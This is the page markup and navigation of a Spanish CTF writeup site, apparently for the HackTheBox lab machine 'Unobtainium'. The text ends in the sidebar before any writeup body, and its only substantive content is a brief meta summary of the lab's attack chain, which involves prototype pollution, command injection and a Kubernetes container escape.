<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.3a19445c3174e55464794f8d7b5c581d8dcdee797f74e5cbe6f59a3562e0e99186e34e57cc7c5c589d66ce9e1590c410c896d88822c3e063309dfea0fc07631f.css" integrity="sha512-OhlEXDF05VRkeU+Ne1xYHY3N7nl/dOXL5vWaNWLg6ZGG405XzHxcWJ1mzp4VkMQQyJbYiCLD4GMwnf6g/AdjHw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/hackthebox/unobtainium/><title>Unobtainium | d3bo</title><meta name=description content><meta property="og:title" content="Unobtainium"><meta property="og:description" content="Comenzamos explotando una vulnerabilidad de prototype pollution. Luego, aprovechamos un CVE de inyecciÃ³n de comandos para ganar una shell en un contenedor. Para la escalada de privilegios, pivotamos entre contenedores de Kubernetes y analizamos los secretos de un namespace. Finalmente, utilizando el permiso para crear pods, logramos salir del contenedor."><meta property="og:type" content="article"><meta property="og:url" content="/writeups/hackthebox/unobtainium/"><meta property="og:image" content="/writeups/hackthebox/unobtainium/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2024-06-18T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-18T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/writeups/hackthebox/unobtainium/cover.png"><meta name=twitter:title content="Unobtainium"><meta name=twitter:description content="Comenzamos explotando una vulnerabilidad de prototype pollution. Luego, aprovechamos un CVE de inyecciÃ³n de comandos para ganar una shell en un contenedor. Para la escalada de privilegios, pivotamos entre contenedores de Kubernetes y analizamos los secretos de un namespace. Finalmente, utilizando el permiso para crear pods, logramos salir del contenedor."><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/hackthebox/","name":"Hack the Box","position":3},{"@type":"ListItem","name":"Unobtainium","position":4}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1877012045454778" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-850CS210Y8"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-850CS210Y8")</script></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=vanta-bg style=position:absolute;width:100%;height:100%;z-index:-1></div><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>Â¡Nuevo writeup de la mÃ¡quina "<a href=/writeups/hackthebox/unobtainium>Unobtainium</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/hackthebox/unobtainium/><img src=/writeups/hackthebox/unobtainium//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Unobtainium</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/ready/><img src=/writeups/hackthebox/ready//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Ready</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Tabby</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Toolbox</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gatekeeper/><img src=/writeups/tryhackme/gatekeeper//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Gatekeeper</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/cyberlens/><img src=/writeups/tryhackme/cyberlens//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Cyberlens</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Wonderland</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=false>
VulnHub</button><div class=collapse id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-21d2fe7c61cab1f4db96535ccdbf2fb9 aria-expanded=false>
Dockerlabs</button><div class=collapse id=section-21d2fe7c61cab1f4db96535ccdbf2fb9><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3bo</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li><li class=nav-item><a class="nav-link active" href=/writeups/intro/bienvenido/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/ctf/intro/bienvenido/>CTF</a></li><li class=nav-item><a class=nav-link href=/archive/>Archive</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search indexâ€¦</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/intro/bienvenido/><img src=/writeups/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/hackthebox/unobtainium/><img src=/writeups/hackthebox/unobtainium//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Unobtainium</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/enterprise/><img src=/writeups/hackthebox/enterprise//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Enterprise</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/><img src=/writeups/hackthebox/jupiter//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Jupiter</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/october/><img src=/writeups/hackthebox/october//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
October</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/ready/><img src=/writeups/hackthebox/ready//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Ready</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/schooled/><img src=/writeups/hackthebox/schooled//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Schooled</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/><img src=/writeups/hackthebox/bashed-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bashed (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/blue/><img src=/writeups/hackthebox/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/buff/><img src=/writeups/hackthebox/buff//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Buff</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/><img src=/writeups/hackthebox/horizontall-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Horizontall (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/><img src=/writeups/hackthebox/pandora-video//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Pandora (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/tabby/><img src=/writeups/hackthebox/tabby//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Tabby</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/><img src=/writeups/hackthebox/toolbox//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Toolbox</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gatekeeper/><img src=/writeups/tryhackme/gatekeeper//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Gatekeeper</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/cyberlens/><img src=/writeups/tryhackme/cyberlens//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Cyberlens</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/><img src=/writeups/tryhackme/agent-sudo//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Agent sudo</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/><img src=/writeups/tryhackme/agent-t//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Agent T</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/><img src=/writeups/tryhackme/bounty-hacker//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/><img src=/writeups/tryhackme/brooklyn-nine-nine//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Brooklyn Nine Nine</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/><img src=/writeups/tryhackme/chocolate-factory//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Chocolate Factory</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/develpy/><img src=/writeups/tryhackme/develpy//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Develpy</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/gallery/><img src=/writeups/tryhackme/gallery//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
